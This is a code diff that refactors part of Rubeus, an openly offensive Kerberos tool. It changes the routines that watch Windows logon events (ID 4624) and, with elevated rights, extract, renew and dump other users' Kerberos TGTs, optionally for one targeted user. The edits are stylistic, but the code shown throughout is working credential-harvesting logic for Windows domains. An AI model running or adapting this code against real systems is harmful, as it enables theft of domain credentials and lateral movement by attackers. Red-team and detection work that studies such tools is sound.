@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Diagnostics.Eventing.Reader;
 using System.Text.RegularExpressions;
+using System.Threading;
 
 namespace Rubeus
 {
@@ -13,7 +14,6 @@ namespace Rubeus
             //  every 'intervalMinutes' and dumps TGTs JUST for the specific logon IDs (LUIDs) based on the event log.
             // On each interval, renew any tickets that are about to expire and refresh the cache.
             // End result: every "intervalMinutes" a set of currently valid TGT .kirbi files are dumped to console
-
             if (!Helpers.IsHighIntegrity()) {
                 Console.WriteLine("\r\n[X] You need to have an elevated context to dump other users' Kerberos tickets :( \r\n");
                 return;
@@ -23,14 +23,13 @@ namespace Rubeus
             Console.WriteLine("\r\n[*] Monitoring every {0} minutes for 4624 logon events\r\n", intervalMinutes);
 
             // used to keep track of LUIDs we've already dumped
-            var seenLUIDs = new Dictionary<UInt32, bool>();
-
+            Dictionary<uint, bool> seenLUIDs = new Dictionary<uint, bool>();
             // get the current set of TGTs
             List<KRB_CRED> creds = LSA.ExtractTGTs();
 
             while (true) {
                 // check for 4624 logon events in the past "intervalSeconds"
-                string queryString = String.Format("*[System[EventID=4624 and TimeCreated[timediff(@SystemTime) <= {0}]]]", intervalMinutes * 60 * 1000);
+                string queryString = string.Format("*[System[EventID=4624 and TimeCreated[timediff(@SystemTime) <= {0}]]]", intervalMinutes * 60 * 1000);
                 EventLogQuery eventsQuery = new EventLogQuery("Security", PathType.LogName, queryString);
                 EventLogReader logReader = new EventLogReader(eventsQuery);
 
@@ -38,20 +37,18 @@ namespace Rubeus
                     // if there's an event, extract out the logon ID (LUID) for the session
                     string eventMessage = eventInstance.FormatDescription();
                     DateTime eventTime = (DateTime)eventInstance.TimeCreated;
-
                     int startIndex = eventMessage.IndexOf("New Logon:");
                     string message = eventMessage.Substring(startIndex);
 
                     // extract out relevant information from the event log message
-                    var acctNameExpression = new Regex(string.Format(@"\n.*Account Name:\s*(?<name>.+?)\r\n"));
+                    Regex acctNameExpression = new Regex(@"\n.*Account Name:\s*(?<name>.+?)\r\n");
                     Match acctNameMatch = acctNameExpression.Match(message);
-                    var acctDomainExpression = new Regex(string.Format(@"\n.*Account Domain:\s*(?<domain>.+?)\r\n"));
+                    Regex acctDomainExpression = new Regex(@"\n.*Account Domain:\s*(?<domain>.+?)\r\n");
                     Match acctDomainMatch = acctDomainExpression.Match(message);
 
                     if (acctNameMatch.Success) {
-                        var srcNetworkExpression = new Regex(string.Format(@"\n.*Source Network Address:\s*(?<address>.+?)\r\n"));
+                        Regex srcNetworkExpression = new Regex(@"\n.*Source Network Address:\s*(?<address>.+?)\r\n");
                         Match srcNetworkMatch = srcNetworkExpression.Match(message);
-
                         string logonName = acctNameMatch.Groups["name"].Value;
                         string accountDomain = "";
                         string srcNetworkAddress = "";
@@ -67,14 +64,12 @@ namespace Rubeus
                         // ignore SYSTEM logons and other defaults
                         if (!Regex.IsMatch(logonName, @"SYSTEM|LOCAL SERVICE|NETWORK SERVICE|UMFD-[0-9]+|DWM-[0-9]+|ANONYMOUS LOGON", RegexOptions.IgnoreCase)) {
                             Console.WriteLine("\r\n[+] {0} - 4624 logon event for '{1}\\{2}' from '{3}'", eventTime, accountDomain, logonName, srcNetworkAddress);
-
-                            var expression2 = new Regex(string.Format(@"\n.*Logon ID:\s*(?<id>.+?)\r\n"));
+                            Regex expression2 = new Regex(@"\n.*Logon ID:\s*(?<id>.+?)\r\n");
                             Match match2 = expression2.Match(message);
-
                             if (match2.Success) {
                                 try {
                                     // check if we've seen this LUID before
-                                    UInt32 luid = Convert.ToUInt32(match2.Groups["id"].Value, 16);
+                                    uint luid = Convert.ToUInt32(match2.Groups["id"].Value, 16);
                                     if (!seenLUIDs.ContainsKey(luid)) {
                                         seenLUIDs[luid] = true;
                                         // if we haven't seen it, extract any TGTs for that particular logon ID and add to the cache
@@ -105,7 +100,6 @@ namespace Rubeus
                             // renewal limit after checkin interval, so renew the TGT
                             string userName = creds[i].EncryptedPart.ticket_info[0].pname.name_string[0];
                             string domainName = creds[i].EncryptedPart.ticket_info[0].prealm;
-
                             Console.WriteLine("[*] Renewing TGT for {0}@{1}", userName, domainName);
                             byte[] bytes = Renew.TGT(creds[i], false, "", false);
                             KRB_CRED renewedCred = new KRB_CRED(bytes);
@@ -115,32 +109,33 @@ namespace Rubeus
                 }
                 Console.WriteLine("\r\n[*] {0} - Current usable TGTs:\r\n", DateTime.Now);
                 LSA.DisplayTGTs(creds);
-                System.Threading.Thread.Sleep(intervalMinutes * 60 * 1000);
+                Thread.Sleep(intervalMinutes * 60 * 1000);
             }
         }
 
         public static void Monitor4624(int intervalSeconds, string targetUser)
         {
-            // monitors the event log (indefinitely) for 4624 logon events every 'intervalSeconds' and dumps TGTs JUST for the specific
-            //  logon IDs (LUIDs) based on the event log. Can optionally only extract for a targeted user.
+            // monitors the event log (indefinitely) for 4624 logon events every 'intervalSeconds' and
+            // dumps TGTs JUST for the specific logon IDs (LUIDs) based on the event log. Can optionally
+            // only extract for a targeted user.
             if (!Helpers.IsHighIntegrity()) {
                 Console.WriteLine("\r\n[X] You need to have an elevated context to dump other users' Kerberos tickets :( \r\n");
                 return;
             }
             // used to keep track of LUIDs we've already dumped
-            var seenLUIDs = new Dictionary<UInt32, bool>();
+            Dictionary<uint, bool> seenLUIDs = new Dictionary<uint, bool>();
 
             Console.WriteLine("[*] Action: TGT Monitoring");
             Console.WriteLine("[*] Monitoring every {0} seconds for 4624 logon events", intervalSeconds);
 
-            if (!String.IsNullOrEmpty(targetUser)) {
+            if (!string.IsNullOrEmpty(targetUser)) {
                 Console.WriteLine("[*] Target user : {0}", targetUser);
                 targetUser = targetUser.Replace("$", "\\$");
             }
             Console.WriteLine();
             while (true) {
                 // check for 4624 logon events in the past "intervalSeconds"
-                string queryString = String.Format("*[System[EventID=4624 and TimeCreated[timediff(@SystemTime) <= {0}]]]", intervalSeconds * 1000);
+                string queryString = string.Format("*[System[EventID=4624 and TimeCreated[timediff(@SystemTime) <= {0}]]]", intervalSeconds * 1000);
                 EventLogQuery eventsQuery = new EventLogQuery("Security", PathType.LogName, queryString);
                 EventLogReader logReader = new EventLogReader(eventsQuery);
 
@@ -148,20 +143,17 @@ namespace Rubeus
                     // if there's an event, extract out the logon ID (LUID) for the session
                     string eventMessage = eventInstance.FormatDescription();
                     DateTime eventTime = (DateTime)eventInstance.TimeCreated;
-
                     int startIndex = eventMessage.IndexOf("New Logon:");
                     string message = eventMessage.Substring(startIndex);
-
                     // extract out relevant information from the event log message
-                    var acctNameExpression = new Regex(string.Format(@"\n.*Account Name:\s*(?<name>.+?)\r\n"));
+                    Regex acctNameExpression = new Regex(@"\n.*Account Name:\s*(?<name>.+?)\r\n");
                     Match acctNameMatch = acctNameExpression.Match(message);
-                    var acctDomainExpression = new Regex(string.Format(@"\n.*Account Domain:\s*(?<domain>.+?)\r\n"));
+                    Regex acctDomainExpression = new Regex(@"\n.*Account Domain:\s*(?<domain>.+?)\r\n");
                     Match acctDomainMatch = acctDomainExpression.Match(message);
 
                     if (acctNameMatch.Success) {
-                        var srcNetworkExpression = new Regex(string.Format(@"\n.*Source Network Address:\s*(?<address>.+?)\r\n"));
+                        Regex srcNetworkExpression = new Regex(@"\n.*Source Network Address:\s*(?<address>.+?)\r\n");
                         Match srcNetworkMatch = srcNetworkExpression.Match(message);
-
                         string logonName = acctNameMatch.Groups["name"].Value;
                         string accountDomain = "";
                         string srcNetworkAddress = "";
@@ -178,14 +170,13 @@ namespace Rubeus
                         if (!Regex.IsMatch(logonName, @"SYSTEM|LOCAL SERVICE|NETWORK SERVICE|UMFD-[0-9]+|DWM-[0-9]+|ANONYMOUS LOGON", RegexOptions.IgnoreCase)) {
                             Console.WriteLine("\r\n[+] {0} - 4624 logon event for '{1}\\{2}' from '{3}'", eventTime, accountDomain, logonName, srcNetworkAddress);
                             // filter if we're targeting a specific user
-                            if (String.IsNullOrEmpty(targetUser) || (Regex.IsMatch(logonName, targetUser, RegexOptions.IgnoreCase))) {
-                                var expression2 = new Regex(string.Format(@"\n.*Logon ID:\s*(?<id>.+?)\r\n"));
+                            if (string.IsNullOrEmpty(targetUser) || (Regex.IsMatch(logonName, targetUser, RegexOptions.IgnoreCase))) {
+                                Regex expression2 = new Regex(@"\n.*Logon ID:\s*(?<id>.+?)\r\n");
                                 Match match2 = expression2.Match(message);
-
                                 if (match2.Success) {
                                     try {
                                         // check if we've seen this LUID before
-                                        UInt32 luid = Convert.ToUInt32(match2.Groups["id"].Value, 16);
+                                        uint luid = Convert.ToUInt32(match2.Groups["id"].Value, 16);
                                         if (!seenLUIDs.ContainsKey(luid)) {
                                             seenLUIDs[luid] = true;
                                             // if we haven't seen it, extract any TGTs for that particular logon ID
@@ -200,7 +191,7 @@ namespace Rubeus
                         }
                     }
                 }
-                System.Threading.Thread.Sleep(intervalSeconds * 1000);
+                Thread.Sleep(intervalSeconds * 1000);
             }
         }
     }
